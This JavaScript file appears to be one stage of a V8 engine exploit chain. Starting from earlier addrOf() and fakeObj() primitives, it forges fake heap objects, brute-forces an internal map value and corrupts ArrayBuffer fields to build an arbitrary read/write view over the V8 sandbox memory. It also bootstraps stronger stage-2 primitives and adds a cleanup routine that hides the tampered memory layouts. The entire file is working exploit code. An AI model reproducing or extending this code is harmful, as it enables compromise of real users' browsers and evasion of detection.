// Create "sbxMemory" dataview on the V8 sandbox cage from addrOf() & fakeObj() primitives
// Bootstrap reliable stage-2 addrOf() & fakeObj() primitives
// Minimize calls to initial primitives (only 2 calls for each)
{
    log("[i] Crafting sbxMemory dataview & stage-2 primitives", 1);


    // Create arbitrary JS objects
    // Trigger GC twice to ensure stability :
    // - spray arrays to maximize `FixedDoubleArray || JSArray` layout
    // - promote `faker` to old generation, in case addrOf() / fakeObj() trigger GC
    let spray_arr = () => {
        let arr = [];
        for (let i = 0; i < 1000; i++) {
            arr.push([13.37, 13.37]);
        }
        return arr;
    }

    let sprayed_arr = spray_arr();
    let faker = sprayed_arr[500].fill(bi2f(0n));
    majorGC();

    let faker_addr = addrOf(faker);
    assert(isStrongTaggedPtr(faker_addr), "[-] Invalid pointer returned by stage-1 addrOf(): 0x" + hex(faker_addr));

    faker.fill(i2f(faker_addr, faker_addr));
    let fake_num = fakeObj(faker_addr-0x04);
    let fake_obj = fakeObj(faker_addr-0x10);


    // Turn fake_num into a Heap Number
    let kHeapNumberMap = 1;
    let is_number = (obj) => typeof obj === "number";

    if (FINGERPRINT.platform.bitness === "32")
        kHeapNumberMap += (addrOf(null) & ~0xffff);

    const max_kmap = kHeapNumberMap + 0x5000;
    while (kHeapNumberMap <= max_kmap && !is_number(fake_num)) {
        kHeapNumberMap += 4;
        faker[1] = i2f(0x0, kHeapNumberMap);
    }

    assert(is_number(fake_num), "[-] Failed to find kHeapNumberMap (probably due to an unexpected JSArray memory layout)");
    log("[+] Found kHeapNumberMap: 0x" + hex(kHeapNumberMap), 2);


    // Retrieve the float array's map and properties pointers
    let floatarr_headers = f2bi(fake_num);
    log("[+] Found float array headers: 0x" + hex(floatarr_headers), 2);


    // Allocate a new empty buffer
    let sbx_buf = new ArrayBuffer(0, {maxByteLength: 0});
    let sbx_buf_addr = addrOf(sbx_buf);
    let sbx_buf_struct = new STRUCTS.JSArrayBuffer(sbx_buf_addr - 0x8);  // float array's elements offset


    // Turn fake_obj into a float array to edit sbx_buf
    faker[0] = bi2f(floatarr_headers);

    if (FINGERPRINT.platform.bitness === "32") {
        faker[1] = i2f(Number(tagPtr(sbx_buf_struct.byte_length)), 1<<1);
        fake_obj[0] = -Number.MAX_VALUE;

        faker[1] = i2f(Number(tagPtr(sbx_buf_struct.backing_store)), 1<<1);
        fake_obj[0] = bi2f(f2bi(fake_obj[0]) & 0xffffffff00000000n);

    } else {
        faker[1] = i2f(Number(tagPtr(sbx_buf_struct.byte_length)), 1<<1);
        fake_obj[0] = -Number.MAX_VALUE;

        faker[1] = i2f(Number(tagPtr(sbx_buf_struct.max_byte_length)), 1<<1);
        fake_obj[0] = -Number.MAX_VALUE;

        faker[1] = i2f(Number(tagPtr(sbx_buf_struct.backing_store)), 1<<1);
        fake_obj[0] = bi2f(0x0n);
    }


    // Create a DataView-like object on the sandbox cage (1 TB)
    // The first buffer is large enough to access the whole heap sandbox (4 GB)
    // Additional buffers are crafted when trying to access memory beyond kMaxSafeBufferSizeForSandbox (32 GB)
    let sbx_bufs = [sbx_buf];
    let sbx_dataviews = [new DataView(sbx_buf)];

    const buf_max_size = 0x7ffffffff;        // kMaxSafeBufferSizeForSandbox
    const buf_partition = buf_max_size - 8;
    let craftBuffer = (i) => {
        if (FINGERPRINT.platform.bitness === "32") return;
        if (typeof sbx_bufs[i] === "undefined") sbx_bufs[i] = new ArrayBuffer(0, {maxByteLength: 0});
        let sbx_buf_i = new STRUCTS.JSArrayBuffer(addrOf(sbx_bufs[i]));
        sbx_dataviews[0].setBigUint64(Number(sbx_buf_i.byte_length), BigInt(buf_max_size) << 29n, true);
        sbx_dataviews[0].setBigUint64(Number(sbx_buf_i.max_byte_length), BigInt(buf_max_size) << 29n, true);
        sbx_dataviews[0].setBigUint64(Number(sbx_buf_i.backing_store), BigInt(i*buf_partition) << (3n*8n), true);
        sbx_dataviews[i] = new DataView(sbx_bufs[i]);
    }
    craftBuffer(0);  // fix the first buffer (kMaxSafeBufferSizeForSandbox instead of -Number.MAX_VALUE)

    let dataviewProxy = (name) => {
        return (addr, ...args) => {
            addr = Number(addr);
            assert(FINGERPRINT.platform.bitness !== "32" || addr < 0xffffffff, "[-] Invalid 32-bit target address");
            assert(addr < 2**40 && addr >= 0, "[-] Target address is outside the sandbox");

            let i = Math.floor(addr / buf_partition);
            let ofs = addr % buf_partition;

            if (typeof sbx_dataviews[i] === "undefined") craftBuffer(i);

            return sbx_dataviews[i][name](ofs, ...args);
        }
    }

    var sbxMemory = {};
    for (let method of Object.getOwnPropertyNames(DataView.prototype)) {
        if (method.startsWith("get") || method.startsWith("set")) {
            sbxMemory[method] = dataviewProxy(method);
        }
    }
    log("[+] Successfully crafted sbxMemory dataview", 2);


    // Clean fake objects to prevent GC crash
    faker[0] = i2f(kHeapNumberMap, kHeapNumberMap);
    faker[1] = i2f(kHeapNumberMap, kHeapNumberMap);
    fake_obj = null;
    fake_num = null;


    // Add an object property to faker array and replace properties pointer by elements pointer
    // It will survive minor & major GC
    faker["obj"] = {};
    sbxMemory.setUint32(untagPtr(faker_addr)+0x4, faker_addr-0x18, true);


    // Bootstrap stage-2 addrOf() & fakeObj() primitives
    addrOf = (obj) => {
        faker["obj"] = obj;
        return f2il(faker[0]);
    }

    fakeObj = (addr) => {
        faker[0] = i2f(addr, kHeapNumberMap);
        return faker["obj"];
    }

    log("[+] Successfully bootstrapped stage-2 addrOf() & fakeObj() primitives", 2);


    // V8 sandbox is disabled on 32-bit architectures
    if (FINGERPRINT.platform.bitness === "32") {
        function arbRead(addr) {
            return sbxMemory.getBigUint64(addr, true);
        }

        function arbWrite(addr, val) {
            return sbxMemory.setBigUint64(addr, val, true);
        }

        log("[+] V8 Sandbox is disabled on 32-bit architectures: successfully crafted arbRead() & arbWrite()", 2);
    }


    // stage-2 cleaner -> clear suspicious memory layouts:
    // - faker's properties pointer == faker's elements pointer
    // - ArrayBuffers byte_length, max_byte_length, and backing_store are suspicious
    // - DataViews are length-tracking and thus legitimate objects
    // NB: not implemented for 32-bit
    let sbxMemoryCleaner = () => {
        if (typeof sbxMemory !== "undefined") {
            if (FINGERPRINT.platform.bitness === "32") return;

            let sbx = sbx_dataviews[0];
            let buf_struct = new STRUCTS.JSArrayBuffer();

            // Clean sbx_dataviews[i] (i >= 1)
            // Make them look like valid empty detached ArrayBuffers
            for (let i = 1; i < sbx_dataviews.length; i++) {
                if (typeof(sbx_dataviews[i]) !== "undefined") {
                    let sbx_buf_i = new STRUCTS.JSArrayBuffer(addrOf(sbx_dataviews[i].buffer));
                    sbx.setBigUint64(Number(sbx_buf_i.byte_length), 0x0n << 29n, true);
                    sbx.setBigUint64(Number(sbx_buf_i.max_byte_length), 0x0n << 29n, true);
                    sbx.setBigUint64(Number(sbx_buf_i.backing_store), 0xffffffffffn << (3n*8n), true);
                    sbx_dataviews[i].buffer.transfer();
                }
            }

            // Create a dummy ArrayBuffer to retrieve a valid backing store pointer
            let dummy_length = Number(buf_struct.backing_store) + 8;
            let dummy = new ArrayBuffer(dummy_length);
            let dummy_buf = new STRUCTS.JSArrayBuffer(addrOf(dummy));
            let dummy_backing_store = sbx.getBigUint64(Number(dummy_buf.backing_store), true);

            // Turn the dummy ArrayBuffer into an empty ArrayBuffer
            sbx.setBigUint64(Number(dummy_buf.byte_length), 0x0n << 29n, true);
            sbx.setBigUint64(Number(dummy_buf.max_byte_length), 0x0n << 29n, true);
            sbx.setBigUint64(Number(dummy_buf.backing_store), 0xffffffffffn << (3n*8n), true);

            // Retrieve addresses before cleaning the primitives
            let faker_addr = addrOf(faker);
            let sbx_buf_addr = addrOf(sbx.buffer);
            assert(isStrongTaggedPtr(faker_addr) && isStrongTaggedPtr(sbx_buf_addr), "[-] Invalid pointer retrieved during memory cleaning");

            // Restore faker map & properties pointer (clean stage-2 primitives)
            sbx.setBigUint64(untagPtr(faker_addr), floatarr_headers, true);

            // Turn sbx_dataview[0] to a valid ArrayBuffer using the dummy backing store
            sbx.setBigUint64(untagPtr(sbx_buf_addr) + Number(buf_struct.backing_store), BigInt(untagPtr(sbx_buf_addr)) << (3n*8n), true);
            sbx.setBigUint64(Number(buf_struct.byte_length), BigInt(dummy_length) << 29n, true);
            sbx.setBigUint64(Number(buf_struct.max_byte_length), BigInt(dummy_length) << 29n, true);
            sbx.setBigUint64(Number(buf_struct.backing_store), dummy_backing_store, true);

            // Allow garbage collection
            sbx_bufs = [];
            sbx_dataviews = [];
            sbxMemory = null;

            log("[+] Successfully cleaned stage-2 primitives", 1);
        }
    }


    // Clean stage-1 and register stage-2 cleaner
    clean("stage1");
    cleaner(sbxMemoryCleaner, "stage2");
}
